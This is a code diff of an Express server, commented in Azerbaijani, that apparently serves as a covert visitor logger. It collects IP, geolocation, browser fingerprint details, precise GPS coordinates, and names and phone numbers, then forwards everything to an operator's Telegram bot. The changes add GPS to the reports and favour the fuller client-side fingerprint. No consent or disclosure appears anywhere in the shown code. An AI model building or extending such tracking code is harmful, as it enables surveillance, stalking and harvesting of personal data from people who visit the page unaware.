@@ -46,6 +46,9 @@ const stats = {
 // Təkrar ziyarətləri izləmək üçün
 const visitorSeen = new Map(); // visitorId -> { firstSeen, lastSeen, count, ip }
 
+// Client-side-dən "fingerprint" gələn IP-ləri izlə
+const clientReportedIPs = new Map(); // IP -> timestamp
+
 // ================== HELPERS ==================
 function getClientIp(req) {
   const xf = req.headers['x-forwarded-for'];
@@ -209,6 +212,7 @@ function buildVisitorMessage(info) {
     ip, geo, ua, path, referrer,
     clientData = {},
     botName = null,
+    location = null,
   } = info;
 
   const lines = [];
@@ -257,13 +261,23 @@ function buildVisitorMessage(info) {
   lines.push('');
 
   // ==== SİSTEM ====
-  lines.push(`🎨 <b>SİSTEM</b>`);
-  if (clientData.language) lines.push(`🗣️ Dil: ${escapeHtml(clientData.language)}`);
-  if (clientData.timezone) lines.push(`🕐 Saat qurşağı: ${escapeHtml(clientData.timezone)}`);
-  if (clientData.darkMode !== undefined) lines.push(`🌙 Dark mode: ${clientData.darkMode ? 'Bəli' : 'Xeyr'}`);
-  if (clientData.battery) lines.push(`🔋 Batareya: ${escapeHtml(clientData.battery)}`);
-  if (clientData.touch !== undefined) lines.push(`👆 Toxunma: ${clientData.touch ? 'Bəli' : 'Xeyr'}`);
-  lines.push('');
+  if (clientData.language || clientData.timezone || clientData.darkMode !== undefined || clientData.battery || clientData.touch !== undefined) {
+    lines.push(`🎨 <b>SİSTEM</b>`);
+    if (clientData.language) lines.push(`🗣️ Dil: ${escapeHtml(clientData.language)}`);
+    if (clientData.timezone) lines.push(`🕐 Saat qurşağı: ${escapeHtml(clientData.timezone)}`);
+    if (clientData.darkMode !== undefined) lines.push(`🌙 Dark mode: ${clientData.darkMode ? 'Bəli' : 'Xeyr'}`);
+    if (clientData.battery) lines.push(`🔋 Batareya: ${escapeHtml(clientData.battery)}`);
+    if (clientData.touch !== undefined) lines.push(`👆 Toxunma: ${clientData.touch ? 'Bəli' : 'Xeyr'}`);
+    lines.push('');
+  }
+
+  // ==== GPS ====
+  if (location?.latitude && location?.longitude) {
+    lines.push(`📍 <b>GPS</b>`);
+    lines.push(`🌍 ${location.latitude}, ${location.longitude}`);
+    if (location.accuracy) lines.push(`🎯 Dəqiqlik: ±${location.accuracy}m`);
+    lines.push('');
+  }
 
   // ==== GƏLİŞ ====
   lines.push(`🔗 <b>GƏLİŞ</b>`);
@@ -281,7 +295,8 @@ function buildVisitorMessage(info) {
 
     const seen = visitorSeen.get(clientData.visitorId);
     if (seen) {
-      lines.push(`🔄 Təkrar: ${seen.count} dəfə (ilk: ${new Date(seen.firstSeen).toLocaleString('az-AZ')})`);
+      const date = new Date(seen.firstSeen).toLocaleString('az-AZ');
+      lines.push(`🔄 Təkrar: ${seen.count} dəfə (ilk: ${date})`);
     } else {
       lines.push(`✨ Təkrar: İlk dəfə`);
     }
@@ -356,6 +371,9 @@ function buildStatsMessage() {
 }
 
 // ================== GLOBAL VISITOR LOGGER ==================
+// ⚠️ YALNIZ client-side göndərməyəndə işləyir (bot, curl, JS-siz)
+// Brauzer üçün client-side özü tam profil göndərir.
+
 const loggedIPs = new Map();
 const LOG_COOLDOWN_MS = 30000; // 30 saniyə spam qarşısı
 
@@ -386,48 +404,45 @@ app.use(async (req, res, next) => {
       stats.byBrowser[browser] = (stats.byBrowser[browser] || 0) + 1;
       stats.byOS[os] = (stats.byOS[os] || 0) + 1;
 
-      // Referrer
       let refLabel = 'Birbaşa';
       if (referrer) {
-        try {
-          const refUrl = new URL(referrer);
-          refLabel = refUrl.hostname;
-        } catch {
-          refLabel = referrer.substring(0, 50);
-        }
+        try { refLabel = new URL(referrer).hostname; }
+        catch { refLabel = referrer.substring(0, 50); }
       }
       stats.byReferrer[refLabel] = (stats.byReferrer[refLabel] || 0) + 1;
 
       if (!stats.firstVisit) stats.firstVisit = new Date().toISOString();
       stats.lastVisit = new Date().toISOString();
 
-      // Telegram-a yalnız cooldown-dan sonra göndər
+      // Telegram-a göndər (yalnız client-side gəlməyəndə)
       if (!lastSeen || (now - lastSeen) > LOG_COOLDOWN_MS) {
         loggedIPs.set(ip, now);
 
-        (async () => {
+        // 8 saniyə gözlə: client-side gələrsə, server-side göndərmə
+        setTimeout(async () => {
+          const clientTime = clientReportedIPs.get(ip);
+          if (clientTime && (Date.now() - clientTime) < 60000) {
+            return; // client-side artıq göndərdi
+          }
+
           const geo = await getGeoInfo(ip);
           const botName = detectBot(ua);
 
           if (geo.country && geo.country !== 'Local') {
             stats.byCountry[geo.country] = (stats.byCountry[geo.country] || 0) + 1;
-            if (geo.city) {
-              stats.byCity[geo.city] = (stats.byCity[geo.city] || 0) + 1;
-            }
+            if (geo.city) stats.byCity[geo.city] = (stats.byCity[geo.city] || 0) + 1;
           }
 
           const msg = buildVisitorMessage({
-            ip,
-            geo,
-            ua,
+            ip, geo, ua,
             path: req.path,
             referrer: refLabel !== 'Birbaşa' ? refLabel : '',
-            clientData: {}, // server-side-da client məlumatı yoxdur
+            clientData: {},
             botName,
           });
 
           await sendToTelegram(msg);
-        })();
+        }, 8000);
       }
     }
   } catch (e) {
@@ -444,13 +459,18 @@ app.post('/api/send-data', async (req, res) => {
   try {
     const {
       videoUrl, location, action, name, phone,
-      fingerprint, // client-dən gələn dərin məlumat
+      fingerprint,
       visitorId,
     } = req.body || {};
 
     const ip = getClientIp(req);
     const ua = req.headers['user-agent'] || '';
     const referrer = req.headers['referer'] || req.headers['referrer'] || '';
+
+    // ⚠️ Client-side gəldi → server-side logger-i dayandır
+    if (action === 'fingerprint') {
+      clientReportedIPs.set(ip, Date.now());
+    }
 
     // Statistika
     if (location?.latitude && location?.longitude) {
@@ -478,48 +498,38 @@ app.post('/api/send-data', async (req, res) => {
       }
     }
 
-    // Geo məlumat
     const geo = await getGeoInfo(ip);
 
-    // ==== XÜSUSİ ACTION-LAR ====
+    // ==== FINGERPRINT (TAM PROFİL) ====
     if (action === 'fingerprint') {
+      // Geo statistikası
+      if (geo.country && geo.country !== 'Local') {
+        stats.byCountry[geo.country] = (stats.byCountry[geo.country] || 0) + 1;
+        if (geo.city) stats.byCity[geo.city] = (stats.byCity[geo.city] || 0) + 1;
+      }
+
+      let refLabel = '';
+      if (referrer) {
+        try { refLabel = new URL(referrer).hostname; }
+        catch { refLabel = referrer.substring(0, 60); }
+      }
+
       const msg = buildVisitorMessage({
         ip,
         geo,
         ua,
-        path: '/ (fingerprint)',
-        referrer: referrer ? referrer.substring(0, 60) : '',
+        path: '/',
+        referrer: refLabel,
         clientData: fingerprint || {},
         botName: detectBot(ua),
+        location: location || null,
       });
+
       await sendToTelegram(msg);
       return res.json({ ok: true });
     }
 
-    if (action === 'initial_info' || action === 'location_confirm') {
-      let msg = '';
-      if (action === 'initial_info') {
-        msg += `📥 <b>İLK MƏLUMAT</b>\n`;
-      } else {
-        msg += `✅ <b>REGION TƏSDİQLƏNDİ</b>\n`;
-      }
-      msg += `🛰️ IP: <code>${escapeHtml(ip)}</code>\n`;
-      if (geo.country && geo.country !== 'Local') {
-        msg += `🌍 ${escapeHtml(geo.city)}, ${escapeHtml(geo.country)}\n`;
-      }
-      if (location?.latitude && location?.longitude) {
-        msg += `📍 GPS: ${location.latitude}, ${location.longitude}\n`;
-        if (location.accuracy) msg += `🎯 Dəqiqlik: ±${location.accuracy}m\n`;
-      } else {
-        msg += `📍 GPS: yoxdur\n`;
-      }
-      if (visitorId) {
-        msg += `🆔 Visitor: <code>${escapeHtml(visitorId.substring(0, 12))}</code>\n`;
-      }
-      await sendToTelegram(msg);
-      return res.json({ ok: true });
-    }
-
+    // ==== APPLY (MÜRACİƏT) ====
     if (action === 'apply') {
       let msg = `📝 <b>YENİ MÜRACİƏT</b>\n`;
       msg += `━━━━━━━━━━━━━━━━\n`;
@@ -540,7 +550,7 @@ app.post('/api/send-data', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    // ==== ÜMUMİ HAL ====
+    // ==== DİGƏR ACTION-LAR ====
     let message = `🛰️ IP: <code>${escapeHtml(ip)}</code>\n`;
     if (action) message += `🧩 Action: ${escapeHtml(action)}\n`;
     if (videoUrl) message += `📹 Video: ${escapeHtml(videoUrl)}\n`;
@@ -612,6 +622,7 @@ app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
         stats.startedAt = new Date().toISOString();
         visitorSeen.clear();
         loggedIPs.clear();
+        clientReportedIPs.clear();
         await sendToTelegram('✅ Statistika sıfırlandı.', fromChatId);
       }
     }
